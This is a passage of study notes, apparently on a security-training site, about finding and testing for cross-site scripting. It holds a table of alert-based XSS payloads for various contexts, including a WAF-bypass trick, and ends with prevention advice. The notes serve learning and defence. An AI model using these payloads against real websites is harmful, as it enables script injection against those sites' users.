id='how-to-find-and-test-for-xss-vulnerabilities'><span>How to find and test for XSS vulnerabilities</span></h3><p><a href='https://portswigger.net/web-security/cross-site-scripting/cheat-sheet' target='_blank' class='url'>https://portswigger.net/web-security/cross-site-scripting/cheat-sheet</a></p><p>⬛️◽️◼️</p><p><a href='xss.html'><span>Top</span></a></p><p><span>The vast majority of XSS vulnerabilities can be found using the Burp Suites </span><font color=purple><span>web vulnerbility scanner</span></font></p><p>&nbsp;</p><p><span>Manually testing for </span><strong><span>reflected</span></strong><span> and </span><strong><span>stored</span></strong><span> XSS normally involves submitting some simple unique input such as random characters into every entry point in the application, identifing every location where the submitted input is returned in HTTP responses, and testing each location individually to determine whether suitably crafted input can be used to execute arbitrary JavaScript. You can then determine the </span><u><span>context</span></u><span> in which the XSS occurs and select a suitable payload to exploit it.</span></p><p>&nbsp;</p><p><span>Manually testing for </span><strong><span>DOM-based</span></strong><span> XSS arising from URL parameters involves a similar process, placing unique input in the parameter, using developer tools, and testing each location to determine wheter it is exploitable. </span></p><p><span>	</span><span>In Non-URL based input or non-HTML based sinks, there is no substitue for reviewing JavaScript code. Best to use Burp Suites </span><font color=purple><span>web vulnerbility scanner</span></font></p><hr /><p>&nbsp;</p><h4 id='context'><span>Context</span></h4><figure><table><thead><tr><th><span>Description</span></th><th><span>Executing</span></th></tr></thead><tbody><tr><td><span>XSS Between HTML Tags</span><br><span>Introduce new tags</span></td><td><code>&lt;script&gt;alert(document.domain)&lt;/script&gt;</code><br><code>&lt;img src=1 onerror=alert(1)&gt;</code></td></tr><tr><td><span>XSS in HTML tag attributes</span><br><span>you may be able to close the tag</span></td><td><code>&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</code><br><code>&quot; autofocus onfocus=alert(document.domain) x=&quot;</code></td></tr><tr><td><span>XSS into JavaScript</span><br><span>terminate the existing script</span></td><td><code>&lt;script&gt;...var input = &#39;controllable data here&#39;;...&lt;/script&gt;</code><br><span>Then break out of existing JavaScript</span><br><code>&lt;/script&gt;&lt;img src=1 onerror=alert(document.domain)&gt;</code></td></tr><tr><td><span>Break out of JavaScript string (&quot;,&#39;,`)</span></td><td><code>&#39;-alert(document.domain)-&#39;</code><br><code>&#39;;alert(document.domain)//</code></td></tr><tr><td><span>Escape the backslash character</span></td><td><code>&#39;;alert(document.domain)//</code><br><span>gets converted to </span><code>\&#39;;alert(document.domain)//</code><br><br><code>\&#39;;alert(document.domain)//</code><br><span>gets converted to </span><code>\\&#39;;alert(document.domain)//</code></td></tr><tr><td><span>Bypass some security WAF</span></td><td><code>onerror=alert;throw 1</code></td></tr><tr><td><span>HTML Encoding</span></td><td><code>&lt;a href=&quot;#&quot; onclick=&quot;... var input=&#39;controllable data here&#39;; ...&quot;&gt;</code><br><span>break out of the JavaScript string</span><br><code>&amp;apos;-alert(document.domain)-&amp;apos;</code></td></tr><tr><td><span>XSS in JavaScript template literals</span></td><td><span>Prints a welcome message with users display name </span><br><code>document.getElementById(&#39;message&#39;).innerText = Welcome, ${user.displayName}.</code><span>;</span><br><span>Use ${...} syntax</span><br><code>&lt;script&gt;...var input =</code><span>&#39;controllable data here&#39;</span><code>;...&lt;/script&gt;</code><br><span>Execute JavaScript without terminating the template literal</span><br><code>${alert(document.domain)}</code></td></tr></tbody></table></figure><hr /><p>&nbsp;</p><h3 id='prevent-xss-attacks'><span>Prevent XSS attacks</span></h3><p>⬛️◽️◼️</p><ul><li><strong><span>Filter input on arrival.</span></strong><span> At the point where user input is received, filter as strictly as possible based on what is expected or valid input.</span></li><li><strong><span>Encode data on output.</span></strong><span> At the point where user-controllable data is output in HTTP responses, encode the output to prevent it from being interpreted as active content. Depending on the output context, this might require applying combinations of HTML, URL, JavaScript, and CSS encoding.</span></li><li><strong><span>Use appropriate response headers.</span></strong><span> To prevent XSS in HTTP responses that aren&#39;t intended to contain any HTML or JavaScript, you can use the </span><code>Content-Type</code><span> and </span><code>X-Content-Type-Options</code><span> headers to ensure that browsers interpret the responses in the way you intend.</span></li><li><strong><span>Content Security Policy.</span></strong><span> As a last line of defense, you can use Content Security Policy (CSP) to reduce the severity of any XSS vulnerabilities that still occur.</span></li></ul><hr /><p>&nbsp;</p></div></div>
</body>
</html>